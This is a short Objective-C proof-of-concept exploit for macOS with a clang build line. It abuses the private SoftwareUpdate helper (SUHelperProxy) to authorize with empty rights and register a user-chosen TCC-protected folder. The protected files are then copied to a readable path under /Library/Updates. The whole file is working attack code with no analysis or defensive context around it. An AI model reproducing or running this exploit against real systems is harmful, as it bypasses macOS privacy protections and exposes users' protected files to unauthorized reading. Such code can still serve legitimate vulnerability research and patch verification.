///  clang exploit.m -o /tmp/exploit -framework Foundation -fobjc-arc -fobjc-link-runtime /Applications/Xcode.app/Contents/Developer/Platforms/MacOSX.platform/Developer/SDKs/MacOSX.sdk/System/Library/PrivateFrameworks/SoftwareUpdate.framework/Versions/A/SoftwareUpdate.tbd

#import <Foundation/Foundation.h>

@protocol SUHelperDProtocol
// some protocol methods
@end

@interface SUHelperProxy : NSObject <SUHelperDProtocol>
{
    unsigned int _suhelperd_port;
    unsigned int _client_port;
    long long _currentRights;
    NSObject<OS_dispatch_queue> *_q;
    NSObject<OS_dispatch_source> *clientPortDeadChecker;
    long long _recentRights;
}

+ (id)sharedHelperProxy;
@property long long recentRights; // @synthesize recentRights=_recentRights;
- (void)authorizeWithEmptyAuthorizationForRights:(long long)arg1;
- (BOOL)registerPersonalizedManifests:(id)arg1 forProductKey:(id)arg2 inForeground:(BOOL)arg3;
@end

int main(int argc, const char * argv[]) {
    if (argc != 2) {
        printf("Usage: %s /path/to/tcc_protected_folder\n", argv[0]);
        return -1;
    }
    
    SUHelperProxy *helper = [SUHelperProxy sharedHelperProxy];
    [helper authorizeWithEmptyAuthorizationForRights:16];
    [helper registerPersonalizedManifests:[NSString stringWithUTF8String:argv[1]] forProductKey:@"exploit" inForeground:FALSE];
    
    printf("All done. Check the TCC protected files from the accessible folder: /Library/Updates/exploit/PersonalizedManifests/ \n");
    return 0;
}
